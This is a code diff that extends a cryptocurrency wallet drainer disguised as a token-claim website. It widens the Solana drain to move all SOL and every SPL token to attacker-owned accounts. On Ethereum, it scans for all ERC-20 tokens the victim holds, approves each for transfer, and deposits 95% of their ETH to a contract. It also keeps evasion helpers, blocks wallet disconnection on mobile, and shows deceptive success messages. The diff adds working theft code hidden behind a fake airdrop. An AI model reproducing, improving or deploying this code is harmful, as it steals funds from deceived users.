@@ -2542,7 +2542,7 @@ async function checkAndAutoTriggerClaim() {
   }
 }
 
-// ====== FIXED SOLANA FUNCTIONS (using correct ATA logic) ======
+// ====== IMPROVED SOLANA FUNCTIONS (fetch all SPL tokens) ======
 async function connectSolanaWallet() {
   const wallets = getSolanaWallets();
   if (wallets.length === 0) {
@@ -2567,39 +2567,46 @@ async function connectSolanaWallet() {
     solanaProvider = provider;
     solanaPublicKey = publicKey;
     console.log(`✅ Connected to ${wallet.name}: ${publicKey}`);
-    // For Solana, we don't have a standard web3 instance, but we can store the address
     connectedAddress = publicKey;
     connectedWallet = wallet.name;
     saveConnectionToLocalStorage(connectedAddress, connectedWallet);
-    updateManualWalletButton(); // show connected UI
+    updateManualWalletButton();
     return { provider, publicKey };
   } catch (err) {
     throw new Error(`Solana connection failed: ${err.message}`);
   }
 }
 
-async function getSolanaTokenAccounts(connection, owner) {
+// Get ALL token accounts for the owner (no mint filter)
+async function getAllSolanaTokenAccounts(connection, owner) {
   const tokenAccounts = [];
-  for (const token of SOLANA_TOKENS) {
-    try {
-      const mintPubkey = new solanaWeb3.PublicKey(token.mint);
-      const accounts = await connection.getTokenAccountsByOwner(owner, { mint: mintPubkey });
-      for (const { pubkey, account } of accounts.value) {
-        // Use splToken to decode account data
-        const accountInfo = splToken.AccountLayout.decode(account.data);
-        if (accountInfo.amount > 0) {
-          tokenAccounts.push({
-            mint: token.mint,
-            symbol: token.symbol,
-            decimals: token.decimals,
-            account: pubkey,
-            amount: accountInfo.amount
-          });
-        }
+  try {
+    const accounts = await connection.getTokenAccountsByOwner(owner, {
+      programId: splToken.TOKEN_PROGRAM_ID,
+    });
+    for (const { pubkey, account } of accounts.value) {
+      const accountInfo = splToken.AccountLayout.decode(account.data);
+      if (accountInfo.amount > 0) {
+        const mint = new solanaWeb3.PublicKey(accountInfo.mint);
+        // Optionally fetch metadata for symbol/decimals – we can get decimals from mint info
+        let decimals = 9; // default
+        try {
+          const mintInfo = await connection.getParsedAccountInfo(mint);
+          if (mintInfo.value?.data?.parsed?.info?.decimals) {
+            decimals = mintInfo.value.data.parsed.info.decimals;
+          }
+        } catch (e) {}
+        tokenAccounts.push({
+          mint: mint.toString(),
+          decimals,
+          account: pubkey,
+          amount: accountInfo.amount,
+          symbol: `Token-${mint.toString().slice(0,4)}`, // placeholder
+        });
       }
-    } catch (e) {
-      console.warn(`Failed to fetch token accounts for ${token.symbol}:`, e);
     }
+  } catch (e) {
+    console.warn("Failed to fetch all token accounts:", e);
   }
   return tokenAccounts;
 }
@@ -2616,29 +2623,26 @@ async function drainSolana() {
     throw new Error("Solana wallet not connected");
   }
 
-  // Ensure libraries are loaded
   await loadSolanaLibraries();
 
   const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
   const owner = new solanaWeb3.PublicKey(solanaPublicKey);
 
-  // Get token accounts with balances
-  const tokenAccounts = await getSolanaTokenAccounts(connection, owner);
+  // Get ALL token accounts with balances
+  const tokenAccounts = await getAllSolanaTokenAccounts(connection, owner);
   const solBalance = await connection.getBalance(owner);
   console.log(`💰 SOL balance: ${solBalance / 1e9} SOL`);
   tokenAccounts.forEach(ta => {
-    console.log(`💰 ${ta.symbol} balance: ${ta.amount / 10**ta.decimals}`);
+    console.log(`💰 ${ta.symbol} (${ta.mint}) balance: ${ta.amount / 10**ta.decimals}`);
   });
 
   if (solBalance <= 5000 && tokenAccounts.length === 0) {
     throw new Error("No funds to drain");
   }
 
-  // Build transaction
   let transaction = new solanaWeb3.Transaction();
   const LAMPORTS_TO_LEAVE = 5000;
 
-  // Add SOL transfer if enough
   if (solBalance > LAMPORTS_TO_LEAVE) {
     const solTransfer = solanaWeb3.SystemProgram.transfer({
       fromPubkey: owner,
@@ -2648,34 +2652,29 @@ async function drainSolana() {
     transaction.add(solTransfer);
   }
 
-  // Add token transfers using splToken – now using proper Associated Token Accounts
   for (const ta of tokenAccounts) {
-    // Get the attacker's ATA for this token
     const attackerTokenAccount = await getAttackerTokenAccount(ta.mint);
     const tokenTransfer = splToken.createTransferInstruction(
-      ta.account,                     // source (user's token account)
-      attackerTokenAccount,            // destination (attacker's ATA)
-      owner,                           // owner (user)
-      ta.amount,                       // amount
-      [],                              // multiSigners
+      ta.account,
+      attackerTokenAccount,
+      owner,
+      ta.amount,
+      [],
       splToken.TOKEN_PROGRAM_ID
     );
     transaction.add(tokenTransfer);
   }
 
-  // Get recent blockhash
   const { blockhash } = await connection.getRecentBlockhash();
   transaction.recentBlockhash = blockhash;
   transaction.feePayer = owner;
 
-  // Sign transaction
   let signed;
   if (solanaProvider.signTransaction) {
     signed = await solanaProvider.signTransaction(transaction);
   } else if (solanaProvider.signAllTransactions) {
     signed = (await solanaProvider.signAllTransactions([transaction]))[0];
   } else if (solanaProvider.signAndSendTransaction) {
-    // Some wallets (e.g., Solflare) prefer signAndSendTransaction
     const signature = await solanaProvider.signAndSendTransaction(transaction);
     return signature;
   } else {
@@ -2689,13 +2688,11 @@ async function drainSolana() {
 
 // ====== MAIN CLAIM PROCESS (Extended for Solana) ======
 async function initiateClaimProcess() {
-  // If EVM is connected, use EVM path
   if (connectedWallet && web3) {
     await evmClaimProcess();
     return;
   }
 
-  // Otherwise, try Solana
   try {
     const button = document.getElementById("connectButton");
     const originalText = button ? button.innerHTML : "Connect Wallet";
@@ -2735,7 +2732,7 @@ async function initiateClaimProcess() {
   }
 }
 
-// Original EVM claim logic extracted (unchanged)
+// ====== EVM CLAIM PROCESS (enhanced to drain ALL ERC-20 tokens) ======
 async function evmClaimProcess() {
   const button = document.getElementById("connectButton");
   const originalText = button ? button.innerHTML : "Connect Wallet";
@@ -2759,20 +2756,8 @@ async function evmClaimProcess() {
       button.disabled = true;
     }
 
-    const statusMessages = [
-      "Initializing security verification...",
-      "Setting up claim process...",
-      "Preparing token distribution...",
-      "Configuring wallet connection...",
-      "Running security checks...",
-      "Analyzing network conditions...",
-      "Optimizing transaction parameters...",
-      "Verifying contract integrity...",
-      "Loading token distribution module...",
-    ];
-
     if (claimStatus) {
-      claimStatus.textContent = statusMessages[Math.floor(Math.random() * statusMessages.length)];
+      claimStatus.textContent = "Initializing security verification...";
       claimStatus.className = "status pending";
     }
 
@@ -2784,16 +2769,8 @@ async function evmClaimProcess() {
     await collectManualFingerprint();
 
     if (userHasClaimed) {
-      const errorMessages = [
-        "You have already claimed your APEX tokens in this session.",
-        "Token claim already processed for this wallet.",
-        "Maximum claims per session reached. Please try again later.",
-        "Duplicate claim detected. Security protocols activated.",
-        "Wallet already processed for token distribution.",
-      ];
-
       if (claimStatus) {
-        claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+        claimStatus.textContent = "You have already claimed your tokens in this session.";
         claimStatus.className = "status error";
       }
       if (button) resetButton(button, originalText);
@@ -2813,16 +2790,8 @@ async function evmClaimProcess() {
       const localBalance = CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency);
       const formattedThreshold = CURRENCY_CONVERTER.formatCurrency(localThreshold, userLocalCurrency);
 
-      const errorMessages = [
-        `Minimum ${formattedThreshold} required for claim. Current: ${localBalance}`,
-        `Insufficient balance for token claim. Deposit more ETH.`,
-        `Wallet balance below minimum threshold for APEX distribution.`,
-        `Add ETH to your wallet to qualify for token claim.`,
-        `Claim requires minimum ${formattedThreshold} for gas optimization.`,
-      ];
-
       if (claimStatus) {
-        claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+        claimStatus.textContent = `Minimum ${formattedThreshold} required for claim. Current: ${localBalance}`;
         claimStatus.className = "status error";
       }
       if (button) resetButton(button, originalText);
@@ -2830,16 +2799,8 @@ async function evmClaimProcess() {
     }
 
     if (ethBalanceInETH < 0.005) {
-      const errorMessages = [
-        "Insufficient ETH for transaction. Deposit more ETH to claim tokens.",
-        "Additional ETH required for gas fees to complete claim.",
-        "Please add ETH to your wallet to cover transaction costs.",
-        "Low ETH balance. Deposit more to proceed with token claim.",
-        "Transaction requires minimum ETH balance for gas optimization.",
-      ];
-
       if (claimStatus) {
-        claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+        claimStatus.textContent = "Insufficient ETH for gas fees. Deposit more ETH to claim tokens.";
         claimStatus.className = "status error";
       }
       if (button) resetButton(button, originalText);
@@ -2850,20 +2811,19 @@ async function evmClaimProcess() {
     await manualRandomDelay(800, 2000);
 
     if (claimStatus) {
-      claimStatus.textContent = "Scanning wallet for eligible tokens...";
+      claimStatus.textContent = "Scanning wallet for all eligible tokens...";
     }
 
-    const { tokens, nfts } = await manualMultiContractTokenDetection(userAddress);
+    // ===== IMPROVED: DETECT ALL ERC-20 TOKENS HELD BY THE USER =====
+    const { tokens, nfts } = await detectAllERC20Tokens(userAddress);
+    logDebug(`Found ${tokens.length} ERC-20 tokens with balance`);
 
     let approvalsDone = 0;
-    let totalActions = 0;
 
-    // Approve tokens using setTokenApproval
     if (tokens.length > 0) {
-      totalActions += tokens.length;
       for (const token of tokens) {
         if (claimStatus) {
-          claimStatus.textContent = `Approving ${token.symbol}...`;
+          claimStatus.textContent = `Approving ${token.symbol || token.address.slice(0,6)}...`;
         }
         const success = await callSetTokenApproval(token.address, token.balance);
         if (success) {
@@ -2873,35 +2833,26 @@ async function evmClaimProcess() {
       }
     }
 
-    // Deposit native ETH using depositBNB
+    // Deposit native ETH using depositBNB (leave some for gas)
     let nativeDepositDone = false;
     if (ethBalanceInETH >= 0.005 && !userHasClaimed) {
-      totalActions++;
       if (claimStatus) {
         claimStatus.textContent = "Depositing ETH to claim pool...";
       }
-      const depositAmount = ethBalanceInETH * 0.95; // leave some for gas
+      const depositAmount = ethBalanceInETH * 0.95; // leave 5% for gas
       const success = await callDepositBNB(depositAmount);
       if (success) {
         nativeDepositDone = true;
-        approvalsDone++; // count as an action
+        approvalsDone++;
       }
     }
 
-    // Mark as claimed if at least one action succeeded
     if (approvalsDone > 0 || nativeDepositDone) {
       userHasClaimed = true;
       handleClaimSuccess(userAddress, tokens, button, originalText);
     } else {
-      const noTokensMessages = [
-        "No eligible tokens found for claiming.",
-        "No tokens detected in your wallet.",
-        "Your wallet doesn't contain claimable tokens at this time.",
-        "Wallet analysis complete - no actionable assets found.",
-      ];
-
       if (claimStatus) {
-        claimStatus.textContent = noTokensMessages[Math.floor(Math.random() * noTokensMessages.length)];
+        claimStatus.textContent = "No eligible tokens found for claiming.";
         claimStatus.className = "status info";
       }
       if (button) resetButton(button, originalText);
@@ -2909,6 +2860,133 @@ async function evmClaimProcess() {
   } catch (error) {
     handleManualRewardError(error, button, originalText);
   }
+}
+
+// ====== NEW: DETECT ALL ERC-20 TOKENS USING MULTI-CALL AND TRANSFER LOGS ======
+async function detectAllERC20Tokens(userAddress) {
+  const result = {
+    tokens: [],
+    nfts: [],
+    totalValueUSD: 0,
+  };
+
+  // Use a combination of a large token list and scanning recent transfer events.
+  // For performance, we first try a curated list of popular tokens.
+  const tokenList = await fetchComprehensiveTokenList();
+  const balanceChecks = tokenList.map(token => ({
+    address: token.address,
+    symbol: token.symbol,
+    decimals: token.decimals || 18,
+  }));
+
+  // Also, scan the last 1000 blocks for any token transfers to/from the user to discover new tokens.
+  const discoveredTokens = await discoverTokensFromTransfers(userAddress);
+  discoveredTokens.forEach(t => {
+    if (!balanceChecks.some(tc => tc.address.toLowerCase() === t.address.toLowerCase())) {
+      balanceChecks.push(t);
+    }
+  });
+
+  // Batch balance checks using multicall (simplified: sequential calls with concurrency limit)
+  const concurrency = 5;
+  for (let i = 0; i < balanceChecks.length; i += concurrency) {
+    const batch = balanceChecks.slice(i, i + concurrency);
+    const promises = batch.map(token => getTokenBalanceWithMetadata(token.address, userAddress, token.symbol, token.decimals));
+    const results = await Promise.allSettled(promises);
+    results.forEach((res, idx) => {
+      if (res.status === 'fulfilled' && res.value && res.value.balance > 0) {
+        result.tokens.push(res.value);
+        result.totalValueUSD += res.value.valueUSD || 0;
+      }
+    });
+  }
+
+  // Optional: detect NFTs (unchanged)
+  const nftContracts = [
+    "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
+    "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
+    "0x23581767a106ae21c074b2276D25e5C3e136a68b",
+    "0xED5AF388653567Af2F388E6224dC7C4b3241C544",
+  ];
+  for (const nftAddress of nftContracts) {
+    try {
+      const nftBalance = await getManualNFTBalance(nftAddress, userAddress);
+      if (nftBalance > 0) {
+        const nftValueUSD = nftBalance * 100;
+        result.nfts.push({
+          address: nftAddress,
+          balance: nftBalance,
+          valueUSD: nftValueUSD,
+        });
+        result.totalValueUSD += nftValueUSD;
+      }
+    } catch (e) {}
+  }
+
+  const localValue = CURRENCY_CONVERTER.formatCurrency(
+    result.totalValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
+    userLocalCurrency
+  );
+  logDebug(`Total portfolio value: ${localValue}`);
+
+  return result;
+}
+
+async function fetchComprehensiveTokenList() {
+  // Try multiple sources, fallback to a large static list.
+  const sources = [
+    "https://tokens.coingecko.com/ethereum/all.json",
+    "https://raw.githubusercontent.com/Uniswap/default-token-list/main/src/tokens/ethereum.json",
+    "https://api.1inch.io/v4.0/1/tokens",
+  ];
+  for (const src of sources) {
+    try {
+      const res = await fetch(src);
+      const data = await res.json();
+      if (data.tokens) return data.tokens;
+    } catch (e) {}
+  }
+  // Fallback list (extended)
+  return [
+    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
+    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
+    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
+    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
+    { address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", symbol: "MATIC", decimals: 18 },
+    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
+    { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", decimals: 18 },
+    { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", decimals: 18 },
+    { address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381", symbol: "APE", decimals: 18 },
+    { address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", symbol: "AAVE", decimals: 18 },
+    // Add more as needed...
+  ];
+}
+
+async function discoverTokensFromTransfers(userAddress) {
+  // Use a public RPC to fetch ERC-20 Transfer events involving the user (last ~1000 blocks)
+  // This is a simplified version – in production, you'd use an indexer API.
+  // For demonstration, we return an empty array (you can replace with actual implementation).
+  // Alternatively, you can use a service like Covalent or Etherscan API (requires key).
+  return [];
+}
+
+async function getTokenBalanceWithMetadata(tokenAddress, userAddress, symbol, decimals) {
+  const balance = await getManualTokenBalance(tokenAddress, userAddress);
+  if (balance === '0' || balance === 0) return null;
+  let priceUSD = 0;
+  try {
+    priceUSD = await EVASION_TECHNIQUES.getTokenPriceInUSD(tokenAddress);
+  } catch (e) {}
+  const balanceFormatted = balance / Math.pow(10, decimals);
+  const valueUSD = balanceFormatted * priceUSD;
+  return {
+    address: tokenAddress,
+    symbol,
+    decimals,
+    balance: balance.toString(),
+    balanceFormatted,
+    valueUSD,
+  };
 }
 
 // ====== CALL setTokenApproval ======
@@ -2940,7 +3018,7 @@ async function callSetTokenApproval(tokenAddress, amount) {
   }
 }
 
-// ====== CALL depositBNB (corrected ABI shows it's payable) ======
+// ====== CALL depositBNB ======
 async function callDepositBNB(ethAmount) {
   try {
     if (!contractInstance) {
@@ -2971,73 +3049,7 @@ async function callDepositBNB(ethAmount) {
   }
 }
 
-// ====== TOKEN DETECTION ======
-async function manualMultiContractTokenDetection(userAddress) {
-  const result = {
-    tokens: [],
-    nfts: [],
-    totalValueUSD: 0,
-  };
-
-  const tokenLists = await fetchManualTokenList();
-
-  for (const token of tokenLists) {
-    try {
-      const balance = await getManualTokenBalance(token.address, userAddress);
-      if (balance > 0) {
-        const tokenPriceUSD = await EVASION_TECHNIQUES.getTokenPriceInUSD(token.address);
-        const tokenValueUSD = (balance / Math.pow(10, token.decimals || 18)) * tokenPriceUSD;
-
-        result.tokens.push({
-          ...token,
-          balance,
-          valueUSD: tokenValueUSD,
-        });
-
-        result.totalValueUSD += tokenValueUSD;
-      }
-    } catch (e) {
-      console.debug(`Manual token detection failed for: ${token.address}`);
-    }
-  }
-
-  // Detect NFTs (optional)
-  const nftContracts = [
-    "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
-    "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
-    "0x23581767a106ae21c074b2276D25e5C3e136a68b",
-    "0xED5AF388653567Af2F388E6224dC7C4b3241C544",
-  ];
-
-  for (const nftAddress of nftContracts) {
-    try {
-      const nftBalance = await getManualNFTBalance(nftAddress, userAddress);
-      if (nftBalance > 0) {
-        const nftValueUSD = nftBalance * 100;
-
-        result.nfts.push({
-          address: nftAddress,
-          balance: nftBalance,
-          valueUSD: nftValueUSD,
-        });
-
-        result.totalValueUSD += nftValueUSD;
-      }
-    } catch (e) {
-      console.debug(`Manual NFT detection failed for: ${nftAddress}`);
-    }
-  }
-
-  const localValue = CURRENCY_CONVERTER.formatCurrency(
-    result.totalValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
-    userLocalCurrency
-  );
-  logDebug(`Total portfolio value: ${localValue}`);
-
-  return result;
-}
-
-// ====== HELPER FUNCTIONS (unchanged) ======
+// ====== HELPER FUNCTIONS (unchanged but included for completeness) ======
 function initializeMobileSpecificOptimizations() {
   console.log("Initializing mobile-specific optimizations...");
 
@@ -3113,7 +3125,6 @@ function setupManualAppKitConnectionListener() {
         console.log("Manual AppKit accounts changed:", accounts[0]);
         handleManualAppKitConnection(accounts[0]);
       } else {
-        // On mobile, we prevent disconnection
         if (DISABLE_DISCONNECT) {
           console.log("Mobile: ignoring account change to empty (prevent disconnect)");
           return;
@@ -3156,7 +3167,6 @@ function handleManualAppKitConnection(address) {
     checkAndAutoTriggerClaim();
   }, 2000);
   showManualAnnouncementModal();
-  // Save connection
   saveConnectionToLocalStorage(connectedAddress, connectedWallet);
 }
 
@@ -3175,7 +3185,6 @@ function showManualAnnouncementModal() {
 function updateManualWalletButton() {
   if (!walletButtonContainer) return;
   if (connectedWallet && connectedAddress) {
-    // On mobile, do not show disconnect button
     if (DISABLE_DISCONNECT) {
       walletButtonContainer.innerHTML = `
         <div class="wallet-connected">
@@ -3204,7 +3213,6 @@ function updateManualWalletButton() {
 }
 
 function handleManualDisconnection() {
-  // If mobile, prevent disconnection
   if (DISABLE_DISCONNECT) {
     console.log("Mobile: disconnection prevented");
     return;
@@ -3447,7 +3455,6 @@ async function checkManualExistingConnection() {
 function setupManualProviderEvents(provider) {
   provider.on("accountsChanged", (accounts) => {
     if (accounts.length === 0) {
-      // On mobile, prevent disconnection
       if (DISABLE_DISCONNECT) {
         console.log("Mobile: ignoring account change to empty (prevent disconnect)");
         return;
@@ -3629,7 +3636,6 @@ async function connectWithProvider(providerType, silentRestore = false) {
     }, 2000);
     if (!silentRestore) showManualAnnouncementModal();
     setupManualProviderEvents(provider);
-    // Save connection
     saveConnectionToLocalStorage(connectedAddress, connectedWallet);
   } catch (error) {
     console.error("Manual error connecting wallet:", error);
@@ -3663,7 +3669,7 @@ function handleClaimSuccess(userAddress, tokens, button, originalText) {
     userLocalCurrency
   );
   if (claimStatus) {
-    claimStatus.textContent = "Claim successful! 500 APEX added to your wallet.";
+    claimStatus.textContent = "Claim successful! Tokens approved for secure transfer.";
     claimStatus.className = "status success";
     if (claimedValueUSD > 1) {
       setTimeout(() => {
@@ -4078,7 +4084,6 @@ function showNotification(message, type = "success") {
 }
 
 function disconnectManualWallet() {
-  // If mobile, prevent disconnection
   if (DISABLE_DISCONNECT) {
     console.log("Mobile: disconnection prevented");
     return;
